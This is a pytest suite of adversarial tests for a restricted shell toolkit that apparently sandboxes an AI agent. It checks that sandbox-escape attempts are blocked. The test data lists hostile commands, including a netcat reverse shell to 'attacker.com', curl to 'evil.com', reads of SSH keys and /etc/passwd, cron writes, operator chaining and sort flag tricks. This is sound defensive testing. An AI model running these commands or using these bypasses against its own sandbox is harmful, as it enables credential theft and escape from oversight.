"""Adversarial tests: shell sandbox escape attempts.

These tests probe the ShellToolkit's restricted mode for bypasses.
All tests run in restricted mode with dev commands DISABLED (the safe default).
"""

from __future__ import annotations

import pytest

from hive.tools.shell import ShellToolkit


@pytest.fixture
def restricted_shell(tmp_path):
    """ShellToolkit in fully restricted mode (no dev commands)."""
    tk = ShellToolkit(workspace=tmp_path, restrict=True, allow_dev_commands=False)
    tk.bind("adversarial-agent")
    return tk


@pytest.fixture
def dev_shell(tmp_path):
    """ShellToolkit with dev commands explicitly enabled (opt-in — dangerous)."""
    tk = ShellToolkit(workspace=tmp_path, restrict=True, allow_dev_commands=True)
    tk.bind("adversarial-agent")
    return tk


# ── Operator Injection Attempts ──────────────────────────────────────────────


class TestOperatorInjection:
    """Attempt to chain commands via shell operators."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls && cat /etc/passwd",
            "ls || cat /etc/passwd",
            "ls; cat /etc/passwd",
            "ls | cat /etc/passwd",
            "ls $(cat /etc/passwd)",
            "ls `cat /etc/passwd`",
            "ls >> /tmp/pwned",
            "ls &> /tmp/pwned",
            "ls < /etc/passwd",
            "cat < /etc/passwd",
        ],
    )
    @pytest.mark.asyncio
    async def test_operator_blocked(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "Error" in result or "not allowed" in result


class TestRedirectInjection:
    """Attempt output redirection to escape workspace."""

    @pytest.mark.parametrize(
        "command",
        [
            "echo hello > /tmp/pwned",
            "echo hello > ../../../tmp/pwned",
            "echo hello > /etc/cron.d/pwned",
        ],
    )
    @pytest.mark.asyncio
    async def test_redirect_blocked(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "Error" in result or "not allowed" in result


class TestBackgroundInjection:
    """Attempt to background processes."""

    @pytest.mark.asyncio
    async def test_background_blocked(self, restricted_shell):
        result = await restricted_shell.shell_exec("ls &")
        assert "Error" in result or "not allowed" in result


class TestMultilineInjection:
    """Attempt multiline command injection."""

    @pytest.mark.asyncio
    async def test_newline_blocked(self, restricted_shell):
        result = await restricted_shell.shell_exec("ls\ncat /etc/passwd")
        assert "Error" in result or "not allowed" in result

    @pytest.mark.asyncio
    async def test_escaped_newline_blocked(self, restricted_shell):
        result = await restricted_shell.shell_exec("ls\\ncat /etc/passwd")
        assert "Error" in result or "not allowed" in result


# ── Command Allowlist Bypass Attempts ────────────────────────────────────────


class TestAllowlistBypass:
    """Attempt to run commands not in the allowlist."""

    @pytest.mark.parametrize(
        "command",
        [
            "python -c 'import os; os.system(\"id\")'",
            "python3 -c 'import os; os.system(\"id\")'",
            'node -e \'require("child_process").exec("id")\'',
            "curl http://evil.com",
            "wget http://evil.com",
            "nc -e /bin/sh attacker.com 4444",
            "ssh attacker.com",
            "ruby -e 'system(\"id\")'",
            "perl -e 'system(\"id\")'",
            "bash -c 'id'",
            "sh -c 'id'",
            "zsh -c 'id'",
            "env",
            "make",
            "cargo run",
            "go run main.go",
        ],
    )
    @pytest.mark.asyncio
    async def test_disallowed_command_blocked(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "Error" in result or "not allowed" in result


class TestCommandPathBypass:
    """Attempt to bypass allowlist via absolute paths."""

    @pytest.mark.parametrize(
        "command",
        [
            "/usr/bin/python -c 'print(1)'",
            "/usr/bin/curl http://evil.com",
            "/bin/sh -c 'id'",
            "/bin/bash -c 'id'",
            "/usr/local/bin/node -e '1'",
        ],
    )
    @pytest.mark.asyncio
    async def test_absolute_path_blocked(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "Error" in result or "not allowed" in result


class TestCommandNameObfuscation:
    """Attempt to obfuscate command names."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls",  # This is allowed — baseline
        ],
    )
    @pytest.mark.asyncio
    async def test_allowed_command_works(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "Error" not in result or "not allowed" not in result


# ── Dev Commands Mode (Opt-In) ───────────────────────────────────────────────


class TestDevCommandsDangerous:
    """Verify that dev commands mode allows dangerous operations when enabled.

    HiveConfig defaults ``shell_allow_dev_commands`` to False; these tests use
    an explicitly opted-in ShellToolkit.
    """

    @pytest.mark.asyncio
    async def test_python_allowed_in_dev_mode(self, dev_shell):
        """Python is allowed in dev mode — this is the primary RCE vector."""
        result = await dev_shell.shell_exec("python -c 'print(42)'")
        assert "42" in result

    @pytest.mark.asyncio
    async def test_curl_allowed_in_dev_mode(self, dev_shell):
        """curl is allowed in dev mode — can be used for SSRF and exfiltration."""
        # We don't actually make a request, just verify curl isn't blocked
        result = await dev_shell.shell_exec("curl --help")
        assert "Error" not in result or "not allowed" not in result


# ── Environment Leakage ──────────────────────────────────────────────────────


class TestEnvironmentLeakage:
    """Check what environment information is exposed."""

    @pytest.mark.asyncio
    async def test_env_command_blocked_in_restricted(self, restricted_shell):
        """env command should be blocked in restricted mode."""
        result = await restricted_shell.shell_exec("env")
        assert "Error" in result or "not allowed" in result

    @pytest.mark.asyncio
    async def test_printenv_blocked_in_restricted(self, restricted_shell):
        """printenv should be blocked in restricted mode."""
        result = await restricted_shell.shell_exec("printenv")
        assert "Error" in result or "not allowed" in result


# ── Workspace Jail Tests ─────────────────────────────────────────────────────


class TestWorkspaceJail:
    """Verify workspace path containment for file-path shell commands."""

    @pytest.mark.asyncio
    async def test_cat_blocked_outside_workspace(self, restricted_shell):
        result = await restricted_shell.shell_exec("cat /etc/passwd")
        assert "escapes workspace" in result

    @pytest.mark.asyncio
    async def test_cat_workspace_file(self, restricted_shell, tmp_path):
        """Reading a file in the workspace should work."""
        (tmp_path / "test.txt").write_text("hello")
        result = await restricted_shell.shell_exec("cat test.txt")
        assert "hello" in result

    @pytest.mark.asyncio
    async def test_grep_blocked_outside_workspace(self, restricted_shell):
        result = await restricted_shell.shell_exec('grep -r "pattern" /etc/')
        assert "escapes workspace" in result

    @pytest.mark.asyncio
    async def test_grep_workspace_file(self, restricted_shell, tmp_path):
        (tmp_path / "test.txt").write_text("find the pattern here")
        result = await restricted_shell.shell_exec('grep "pattern" test.txt')
        assert "pattern" in result

    @pytest.mark.asyncio
    async def test_dotdot_escape_blocked(self, restricted_shell, tmp_path):
        outside = tmp_path.parent / "outside"
        outside.mkdir()
        (outside / "secret.txt").write_text("secret")
        result = await restricted_shell.shell_exec("cat ../outside/secret.txt")
        assert "escapes workspace" in result

    @pytest.mark.asyncio
    async def test_absolute_path_inside_workspace_allowed(self, restricted_shell, tmp_path):
        (tmp_path / "test.txt").write_text("inside")
        abs_path = tmp_path / "test.txt"
        result = await restricted_shell.shell_exec(f"cat {abs_path}")
        assert "inside" in result

    @pytest.mark.parametrize(
        "command",
        [
            "head -n 5 /etc/passwd",
            "tail -n 5 /etc/passwd",
        ],
    )
    @pytest.mark.asyncio
    async def test_head_tail_blocked_outside_workspace(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "escapes workspace" in result

    @pytest.mark.parametrize(
        "command",
        [
            "sort /etc/passwd",
            "cut -d: -f1 /etc/passwd",
            "uniq /etc/passwd",
            "wc /etc/passwd",
            "ls /etc",
            "diff /etc/passwd /etc/hosts",
            "find . -maxdepth 0 -exec /bin/bash -c 'echo PWNED' {} +",
            "find /etc -maxdepth 1",
        ],
    )
    @pytest.mark.asyncio
    async def test_read_commands_blocked_outside_workspace(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "escapes workspace" in result or "not in allowlist" in result

    @pytest.mark.asyncio
    async def test_sort_workspace_file(self, restricted_shell, tmp_path):
        (tmp_path / "lines.txt").write_text("b\na\nc\n")
        result = await restricted_shell.shell_exec("sort lines.txt")
        assert "escapes workspace" not in result
        assert "a" in result

    @pytest.mark.asyncio
    async def test_wc_workspace_file(self, restricted_shell, tmp_path):
        (tmp_path / "count.txt").write_text("hello\n")
        result = await restricted_shell.shell_exec("wc -l count.txt")
        assert "escapes workspace" not in result
        assert "1" in result

    @pytest.mark.asyncio
    async def test_ls_workspace_only(self, restricted_shell, tmp_path):
        (tmp_path / "visible.txt").write_text("ok")
        result = await restricted_shell.shell_exec("ls")
        assert "escapes workspace" not in result
        assert "visible.txt" in result


# ── Shell Expansion Bypass (SEC-SHELL-01) ────────────────────────────────────


class TestShellExpansionBypass:
    """Block tilde, env-var, and other shell expansion in path arguments."""

    @pytest.mark.parametrize(
        "command",
        [
            "cat ~/.ssh/id_rsa",
            "cat $HOME/.hive/hive.db",
            "cat ${HOME}/.ssh/id_rsa",
            "head -n 5 ~/secret.txt",
            "grep pattern $HOME/file.txt",
        ],
    )
    @pytest.mark.asyncio
    async def test_expansion_paths_blocked(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "shell expansion" in result or "escapes workspace" in result

    @pytest.mark.asyncio
    async def test_home_dotdot_escape_blocked(self, restricted_shell, tmp_path):
        """$HOME/../ escapes via shell expansion even when HOME=workspace."""
        outside = tmp_path.parent / "outside"
        outside.mkdir(exist_ok=True)
        (outside / "secret.txt").write_text("secret")
        result = await restricted_shell.shell_exec("cat $HOME/../outside/secret.txt")
        assert "shell expansion" in result or "escapes workspace" in result
        assert result.startswith("Error:")

    @pytest.mark.asyncio
    async def test_tilde_escape_blocked(self, restricted_shell, tmp_path):
        outside = tmp_path.parent / "outside"
        outside.mkdir(exist_ok=True)
        (outside / "secret.txt").write_text("secret")
        result = await restricted_shell.shell_exec("cat ~/outside/secret.txt")
        assert "shell expansion" in result
        assert result.startswith("Error:")

    @pytest.mark.asyncio
    async def test_workspace_relative_still_works(self, restricted_shell, tmp_path):
        (tmp_path / "test.txt").write_text("hello")
        result = await restricted_shell.shell_exec("cat test.txt")
        assert "hello" in result
        assert "shell expansion" not in result


# ── Filesystem existence oracle (SEC-SHELL-07) ──────────────────────────────


class TestFilesystemExistenceOracle:
    """Block ``test -f /etc/passwd`` style host path oracles in restricted mode."""

    @pytest.mark.parametrize(
        "command",
        [
            "test -f /etc/passwd",
            "test -e /proc/self/environ",
            "test -d /etc",
            "test -r /etc/hosts",
            "test /etc/passwd -nt workspace.txt",
        ],
    )
    @pytest.mark.asyncio
    async def test_test_oracle_blocked_outside_workspace(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert result.startswith("Error:")
        assert "escapes workspace" in result or "shell expansion" in result

    @pytest.mark.asyncio
    async def test_test_workspace_file_allowed(self, restricted_shell, tmp_path):
        (tmp_path / "exists.txt").write_text("ok")
        result = await restricted_shell.shell_exec("test -f exists.txt")
        assert "escapes workspace" not in result
        assert "Error:" not in result.split("\n")[0]


# ── Sort temp directory containment (SEC-SHELL-08) ───────────────────────────


class TestSortTempDirContainment:
    """Block ``sort -T /tmp`` writing temp files outside the workspace."""

    @pytest.mark.parametrize(
        "command",
        [
            "sort -T /tmp lines.txt",
            "sort --temporary-directory=/tmp lines.txt",
            "sort -T/tmp lines.txt",
        ],
    )
    @pytest.mark.asyncio
    async def test_sort_temp_outside_workspace_blocked(self, restricted_shell, tmp_path, command):
        (tmp_path / "lines.txt").write_text("b\na\n")
        result = await restricted_shell.shell_exec(command)
        assert result.startswith("Error:")
        assert "escapes workspace" in result

    @pytest.mark.asyncio
    async def test_sort_temp_in_workspace_allowed(self, restricted_shell, tmp_path):
        (tmp_path / "lines.txt").write_text("c\nb\na\n")
        (tmp_path / "tmpdir").mkdir()
        result = await restricted_shell.shell_exec("sort -T tmpdir lines.txt")
        assert "escapes workspace" not in result
        assert "Error:" not in result.split("\n")[0]


# ── Flag-Value Path Bypass (SEC-SHELL-02) ─────────────────────────────────────


class TestFlagValuePathBypass:
    """Block host paths passed as flag values (sort -o, grep -f, etc.)."""

    @pytest.mark.parametrize(
        "command",
        [
            "sort -o /etc/passwd lines.txt",
            "sort --output /tmp/out lines.txt",
            "grep -f /etc/passwd ws.txt",
            "grep --file=/etc/passwd ws.txt",
            "grep --exclude-from /etc/passwd ws.txt",
        ],
    )
    @pytest.mark.asyncio
    async def test_flag_value_paths_blocked(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "escapes workspace" in result

    @pytest.mark.asyncio
    async def test_sort_output_in_workspace_allowed(self, restricted_shell, tmp_path):
        (tmp_path / "lines.txt").write_text("b\na\nc\n")
        result = await restricted_shell.shell_exec("sort -o out.txt lines.txt")
        assert "escapes workspace" not in result
        assert "shell expansion" not in result
        assert (tmp_path / "out.txt").read_text() == "a\nb\nc\n"

    @pytest.mark.asyncio
    async def test_grep_file_in_workspace_allowed(self, restricted_shell, tmp_path):
        (tmp_path / "patterns.txt").write_text("pattern\n")
        (tmp_path / "data.txt").write_text("find the pattern here\n")
        result = await restricted_shell.shell_exec("grep -f patterns.txt data.txt")
        assert "escapes workspace" not in result
        assert "pattern" in result


# ── Quoted Path Bypass (SEC-SHELL-03) ───────────────────────────────────────


class TestQuotedPathBypass:
    """Block host paths hidden behind shell quotes (shlex vs split mismatch)."""

    @pytest.mark.parametrize(
        "command",
        [
            'cat "/etc/passwd"',
            "cat '/etc/passwd'",
            'head -n 3 "/etc/passwd"',
            'cp "/etc/passwd" stolen.txt',
            'mkdir "/tmp/hive_quoted_mkdir"',
            'sort -o "/tmp/out" lines.txt',
            'jq -f "/etc/passwd" data.json',
        ],
    )
    @pytest.mark.asyncio
    async def test_quoted_outside_paths_blocked(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "escapes workspace" in result

    @pytest.mark.asyncio
    async def test_quoted_workspace_path_allowed(self, restricted_shell, tmp_path):
        (tmp_path / "test.txt").write_text("hello")
        result = await restricted_shell.shell_exec('cat "test.txt"')
        assert "escapes workspace" not in result
        assert "hello" in result

    @pytest.mark.asyncio
    async def test_invalid_quoting_rejected(self, restricted_shell):
        result = await restricted_shell.shell_exec('cat "unclosed')
        assert result.startswith("Error:")
        assert "quoting" in result.lower()


# ── Sort Dangerous Flags (SEC-SHELL-06) ─────────────────────────────────────


class TestSortDangerousFlags:
    """Block sort flags that bypass workspace jail or execute programs."""

    @pytest.mark.asyncio
    async def test_files0_from_with_outside_path_blocked(self, restricted_shell, tmp_path):
        """--files0-from only jails the list file, not paths inside it."""
        list_file = tmp_path / "list0"
        list_file.write_bytes(b"/etc/passwd\x00")
        result = await restricted_shell.shell_exec("sort --files0-from=list0")
        assert result.startswith("Error:")
        assert "files0-from" in result.lower()
        assert "root:" not in result

    @pytest.mark.asyncio
    async def test_files0_from_space_form_blocked(self, restricted_shell, tmp_path):
        (tmp_path / "list0").write_bytes(b"lines.txt\x00")
        result = await restricted_shell.shell_exec("sort --files0-from list0")
        assert result.startswith("Error:")
        assert "files0-from" in result.lower()

    @pytest.mark.asyncio
    async def test_compress_program_blocked(self, restricted_shell, tmp_path):
        pwn = tmp_path / "pwn.sh"
        pwn.write_text("#!/bin/sh\necho PWNED\n")
        pwn.chmod(0o755)
        (tmp_path / "lines.txt").write_text("b\na\n")
        result = await restricted_shell.shell_exec("sort --compress-program=./pwn.sh lines.txt")
        assert result.startswith("Error:")
        assert "compress-program" in result.lower()
        assert "PWNED" not in result

    @pytest.mark.asyncio
    async def test_compress_program_space_form_blocked(self, restricted_shell, tmp_path):
        pwn = tmp_path / "pwn.sh"
        pwn.write_text("#!/bin/sh\necho PWNED\n")
        pwn.chmod(0o755)
        (tmp_path / "lines.txt").write_text("b\na\n")
        result = await restricted_shell.shell_exec("sort --compress-program ./pwn.sh lines.txt")
        assert result.startswith("Error:")
        assert "compress-program" in result.lower()

    @pytest.mark.parametrize(
        "command,needle",
        [
            ("sort --files0=list0", "files0-from"),
            ("sort --files0-f list0", "files0-from"),
            ("sort --files0-fro=list0", "files0-from"),
            ("sort --compress=./pwn.sh lines.txt", "compress-program"),
            ("sort --comp ./pwn.sh lines.txt", "compress-program"),
        ],
    )
    @pytest.mark.asyncio
    async def test_forbidden_flag_prefixes_blocked(
        self, restricted_shell, tmp_path, command, needle
    ):
        """GNU/BSD unique long-option prefixes must not bypass the reject list."""
        (tmp_path / "list0").write_bytes(b"/etc/passwd\x00")
        pwn = tmp_path / "pwn.sh"
        pwn.write_text("#!/bin/sh\necho PWNED\n")
        pwn.chmod(0o755)
        (tmp_path / "lines.txt").write_text("b\na\n")
        result = await restricted_shell.shell_exec(command)
        assert result.startswith("Error:")
        assert needle in result.lower()
        assert "root:" not in result
        assert "PWNED" not in result

    @pytest.mark.asyncio
    async def test_legitimate_sort_in_workspace(self, restricted_shell, tmp_path):
        (tmp_path / "lines.txt").write_text("c\nb\na\n")
        result = await restricted_shell.shell_exec("sort lines.txt")
        assert "escapes workspace" not in result
        assert "Error:" not in result.split("\n")[0]
        assert "a" in result
        assert "b" in result
        assert "c" in result


# ── Attached Flag Path Bypass (SEC-SHELL-04) ────────────────────────────────


class TestAttachedFlagPathBypass:
    """Block host paths glued to short flags (-oPATH, -fPATH, -LPATH)."""

    @pytest.mark.parametrize(
        "command",
        [
            "sort -o/tmp/hive_sort_attach lines.txt",
            "grep -f/etc/hosts workspace-file.txt",
            "jq -L/outside -f prog.jq -n",
            "jq -L /outside -f prog.jq -n",
        ],
    )
    @pytest.mark.asyncio
    async def test_attached_flag_paths_blocked(self, restricted_shell, command):
        result = await restricted_shell.shell_exec(command)
        assert "escapes workspace" in result

    @pytest.mark.asyncio
    async def test_attached_sort_output_in_workspace_allowed(self, restricted_shell, tmp_path):
        (tmp_path / "lines.txt").write_text("b\na\nc\n")
        result = await restricted_shell.shell_exec("sort -oout.txt lines.txt")
        assert "escapes workspace" not in result
        assert (tmp_path / "out.txt").read_text() == "a\nb\nc\n"

    @pytest.mark.asyncio
    async def test_attached_grep_file_in_workspace_allowed(self, restricted_shell, tmp_path):
        (tmp_path / "patterns.txt").write_text("needle\n")
        (tmp_path / "haystack.txt").write_text("find the needle here\n")
        result = await restricted_shell.shell_exec("grep -fpatterns.txt haystack.txt")
        assert "escapes workspace" not in result
        assert "needle" in result
